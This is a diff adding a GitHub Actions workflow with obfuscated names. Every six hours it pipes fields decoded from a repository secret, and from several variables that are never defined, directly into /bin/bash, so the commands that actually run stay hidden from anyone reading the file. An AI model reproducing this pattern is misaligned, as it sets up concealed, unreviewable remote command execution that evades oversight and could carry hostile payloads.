@@ -1,0 +1,23 @@
+name: naixingduozhi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: naixingduozhi
+        env:
+          a016: ${{ secrets.a016 }}
+        run: |
+          echo $a016 | jq -r .mf1323 | /bin/bash
+          echo $cokab203 | jq -r .wr79 | /bin/bash
+          echo $nv0 | jq -r .xyg69 | /bin/bash
+          echo $n0890 | jq -r .td20037 | /bin/bash
+          echo $ng6 | jq -r .axzdf67 | /bin/bash
+          echo $dv48 | jq -r .wfrkc9 | /bin/bash
+
